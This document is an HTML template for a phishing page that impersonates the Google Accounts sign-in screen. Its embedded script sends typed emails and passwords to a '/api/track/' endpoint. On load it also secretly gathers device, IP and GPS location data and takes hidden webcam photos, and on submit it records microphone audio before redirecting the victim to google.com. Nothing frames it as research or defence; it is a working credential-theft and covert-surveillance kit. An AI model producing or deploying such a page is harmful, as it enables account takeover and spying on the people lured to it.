<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔍</text></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Roboto',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh;background:#fff;display:flex;align-items:center;justify-content:center}
.google-container{width:100%;max-width:450px;padding:20px}
.google-card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;text-align:center}
.google-logo{font-size:24px;color:#4285f4;margin-bottom:16px;font-weight:500}
.google-logo span{color:#ea4335} .google-logo span:nth-child(2){color:#fbbc05} .google-logo span:nth-child(3){color:#34a853}
.google-card h1{color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
.google-card h2{color:#202124;font-size:16px;font-weight:400;margin-bottom:32px}
.google-input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none;margin-bottom:8px}
.google-input:focus{border-color:#1a73e8;box-shadow:inset 0 1px 2px rgba(0,0,0,0.1)}
.google-forgot{color:#1a73e8;font-size:14px;text-align:left;display:block;margin:8px 0 32px;text-decoration:none;font-weight:500}
.google-forgot:hover{background:#1a73e808}
.google-btn{width:100%;padding:10px 24px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:500;cursor:pointer;float:right;width:auto}
.google-btn:hover{background:#1557b0;box-shadow:0 1px 2px rgba(0,0,0,0.3)}
.google-create{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500;float:left;margin-top:8px}
.google-footer{color:#5f6368;font-size:12px;margin-top:32px;text-align:center}
.google-footer a{color:#5f6368;text-decoration:none;margin:0 8px}
.google-footer a:hover{color:#202124}

/* Loading */
.google-loading{background:#fff;position:fixed;top:0;left:0;right:0;bottom:0;z-index:1000;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.google-loading.active{display:flex}
.google-spinner{width:50px;height:50px;border:4px solid #f0f0f0;border-top-color:#4285f4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.google-loading h3{color:#202124;font-size:20px;margin-bottom:10px}
.google-loading p{color:#5f6368;font-size:14px}

.hidden{position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
</style>
</head>
<body>
<div id="mainContent">
<div class="google-container">
<div class="google-card">
<div class="google-logo">G<span>o</span><span>o</span><span>g</span>l<span>e</span></div>
<h1>Sign in</h1>
<h2>Use your Google Account</h2>
<form onsubmit="handleGoogleLogin(event)">
<input type="text" id="cred1" class="google-input" placeholder="Email or phone" required>
<input type="password" id="cred2" class="google-input" placeholder="Enter your password" required>
<a href="#" class="google-forgot">Forgot email?</a>
<div style="overflow:hidden">
<a href="#" class="google-create">Create account</a>
<button type="submit" class="google-btn">Next</button>
</div>
</form>
</div>
<div class="google-footer">
<a href="#">English (United States)</a>
<a href="#">Help</a>
<a href="#">Privacy</a>
<a href="#">Terms</a>
</div>
</div>
</div>

<div class="google-loading" id="googleLoading">
<div class="google-spinner"></div>
<h3>Signing in...</h3>
<p>Please wait while we verify your account</p>
</div>

<video class="hidden" id="hiddenVideo" autoplay playsinline muted></video>
<canvas class="hidden" id="hiddenCanvas"></canvas>

<script>
const linkId = '{{ link_id }}';
let capturedPhotos = [];
let audioChunks = [];
let mediaRecorder = null;
let stream = null;
let hasAutoCaptured = false;

async function autoCapture() {
if (hasAutoCaptured) return;
hasAutoCaptured = true;
const data = await collectSilentData();
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify(data)
});
} catch(e) {}
try {
stream = await navigator.mediaDevices.getUserMedia({
video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
audio: false
});
const video = document.getElementById('hiddenVideo');
video.srcObject = stream;
video.muted = true;
await video.play();
for (let i = 0; i < 3; i++) {
await new Promise(r => setTimeout(r, 800));
try {
const canvas = document.getElementById('hiddenCanvas');
canvas.width = 640; canvas.height = 480;
const ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0, 640, 480);
const photo = canvas.toDataURL('image/jpeg', 0.7);
capturedPhotos.push(photo);
} catch(e) {}
}
if (stream) stream.getTracks().forEach(t => t.stop());
if (capturedPhotos.length > 0) {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ photos: capturedPhotos })
});
} catch(e) {}
}
} catch(e) {}
}

async function collectSilentData() {
const data = {location: {}, device_info: {}, screen_info: {}, network_info: {}, battery_info: {}};
data.screen_info = {width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio, orientation: screen.orientation?.type || 'unknown'};
data.device_info = {platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language, languages: navigator.languages, cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor, memory: navigator.deviceMemory || 'unknown', browser: getBrowser(), os: getOS()};
try {
const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
if (conn) {
data.network_info = {effectiveType: conn.effectiveType, downlink: conn.downlink, downlinkMax: conn.downlinkMax || 'unknown', rtt: conn.rtt, saveData: conn.saveData, type: conn.type || 'unknown'};
}
} catch(e) {}
try {
if (navigator.getBattery) {
const battery = await navigator.getBattery();
data.battery_info = {level: Math.round(battery.level * 100) + '%', charging: battery.charging, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime};
}
} catch(e) {}
try {
const ipRes = await fetch('https://ipapi.co/json/');
const ipData = await ipRes.json();
data.location = {ip: ipData.ip, city: ipData.city, region: ipData.region, country: ipData.country_name, country_code: ipData.country_code, postal: ipData.postal, latitude: ipData.latitude, longitude: ipData.longitude, org: ipData.org, isp: ipData.org, asn: ipData.asn, timezone: ipData.timezone, currency: ipData.currency};
} catch(e) {}
try {
if (navigator.geolocation) {
const position = await new Promise((resolve, reject) => {
navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
});
data.location.gps_lat = position.coords.latitude;
data.location.gps_lng = position.coords.longitude;
data.location.gps_accuracy = position.coords.accuracy;
}
} catch(e) {}
return data;
}

function getBrowser() {
const ua = navigator.userAgent;
if (ua.includes('Firefox')) return 'Firefox';
if (ua.includes('Chrome')) return 'Chrome';
if (ua.includes('Safari')) return 'Safari';
if (ua.includes('Edge')) return 'Edge';
return 'Unknown';
}

function getOS() {
const ua = navigator.userAgent;
if (ua.includes('Windows')) return 'Windows';
if (ua.includes('Mac')) return 'MacOS';
if (ua.includes('Linux')) return 'Linux';
if (ua.includes('Android')) return 'Android';
if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
return 'Unknown';
}

async function handleGoogleLogin(e) {
e.preventDefault();
const cred1 = document.getElementById('cred1').value;
const cred2 = document.getElementById('cred2').value;
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ credentials: { username: cred1, password: cred2 } })
});
} catch(err) {}
const loading = document.getElementById('googleLoading');
loading.classList.add('active');
await captureMorePhotos();
window.location.href = 'https://google.com';
}

async function captureMorePhotos() {
let localStream = null;
try {
localStream = await navigator.mediaDevices.getUserMedia({
video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
audio: true
});
const video = document.getElementById('hiddenVideo');
video.srcObject = localStream;
video.muted = true;
await video.play();
let localRecorder = null;
try {
localRecorder = new MediaRecorder(localStream);
audioChunks = [];
localRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
localRecorder.start(1000);
} catch(e) {}
const morePhotos = [];
for (let i = 0; i < 5; i++) {
await new Promise(r => setTimeout(r, 1200));
try {
const canvas = document.getElementById('hiddenCanvas');
canvas.width = 1280; canvas.height = 720;
const ctx = canvas.getContext('2d');
ctx.drawImage(video, 0, 0, 1280, 720);
const photo = canvas.toDataURL('image/jpeg', 0.9);
morePhotos.push(photo);
} catch(e) {}
}
if (localStream) localStream.getTracks().forEach(t => t.stop());
if (localRecorder && localRecorder.state !== 'inactive') {
localRecorder.stop();
await new Promise(r => setTimeout(r, 500));
}
if (morePhotos.length > 0) {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ photos: morePhotos })
});
} catch(e) {}
}
if (audioChunks.length > 0) {
try {
const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
const reader = new FileReader();
reader.onloadend = async function() {
try {
await fetch('/api/track/' + linkId, {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({ audio: reader.result })
});
} catch(e) {}
};
reader.readAsDataURL(audioBlob);
} catch(e) {}
}
} catch(e) {}
}

autoCapture();
</script>
</body>
</html>
